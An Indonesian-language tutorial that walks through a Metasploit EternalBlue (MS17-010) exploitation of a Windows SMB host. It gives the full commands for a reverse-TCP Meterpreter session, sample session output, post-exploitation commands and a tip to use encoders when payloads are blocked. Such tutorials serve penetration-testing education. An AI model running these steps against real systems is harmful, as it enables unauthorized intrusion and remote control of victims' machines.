# Menjalankan Eksploitasi dengan Metasploit Framework

## Apa Itu Eksploitasi?

Eksploitasi adalah proses menyerang dan memanfaatkan kerentanan pada sistem target untuk mendapatkan akses tidak sah, baik melalui `shell`, `akses file`, atau `kontrol penuh`.

Dalam Metasploit Framework, eksploitasi dijalankan melalui modul `exploit` + `payload`, misalnya:

- **Exploit**: `exploit/windows/smb/ms17_010_eternalblue`
- **Payload**: `windows/meterpreter/reverse_tcp`

## Proses Dasar Eksploitasi

Langkah-langkah umum untuk menjalankan eksploitasi di Metasploit Framework:

1. Pilih dan muat modul exploit
2. Tentukan target (RHOST, RPORT)
3. Pilih payload
4. Konfigurasi payload (LHOST, LPORT, dll)
5. Jalankan exploit
6. Kelola sesi yang terbuka (jika berhasil)

## Contoh: Eksploitasi SMB dengan EternalBlue (MS17-010)

### Langkah 1 - Buka MSFConsole

```
msfconsole
```

Tunggu sampai muncul prompt seperti ini:

```
msf6 >
```

### Langkah 2 - Cari Exploit yang Sesuai

```
search eternalblue
```

**Contoh hasil:**

```
exploit/windows/smb/ms17_010_eternalblue
```

### Langkah 3n - Gunakan Exploit

```
use exploit/windows/smb/ms17_010_eternalblue
```

### Langkah 4 - Lihat Opsi Konfigurasi

```
show options
```

### Langkah 5 - Setting Target dan Payload

```
set RHOSTS 192.168.1.10
set RPORT 445
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
```

### Langkah 6 - Jalankan Exploit

```
exploit
```

Jika berhasil, kamu akan mendapatkan sesi Meterpreter.

### Contoh Output Berhasil:

```
[*] Sending stage (203846 bytes) to 192.168.1.10
[+] 192.168.1.45:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.45:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.45:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 2 opened (192.168.1.5:4444 -> 192.168.1.10:49158) at 2025-05-07 20:27:03 +0700

meterpreter > 
```

Setelah berhasil mendapatkan sesi Meterpreter, kamu bisa melakukan beberapa hal diantaranya:

Melihat informasi sistem target:

```
sysinfo
```

Menampilkan User ID (UID):

```
getuid
```

Membuka command shell (cmd.exe) dari mesin korban:

```
shell
```

## Troubleshooting Umum

| Masalah | Solusi |
|:--:|:--:|
| Tidak ada sesi yang terbuka	| Cek firewall, antivirus, atau salah setting RHOST/LHOST |
| Payload tidak terkirim | Gunakan encoder atau coba port lain |
| exploit stuck | Gunakan `set VERBOSE true` untuk debug |

## Kesimpulan

Eksploitasi di Metasploit Framework memerlukan:

1. Pemahaman modul dan payload
2. Konfigurasi parameter yang akurat
3. Kesabaran dan analisa ketika exploit gagal

Dengan latihan dan memahami pola kerja eksploitasi, kamu bisa mengeksekusi serangan yang lebih kompleks dan efisien.
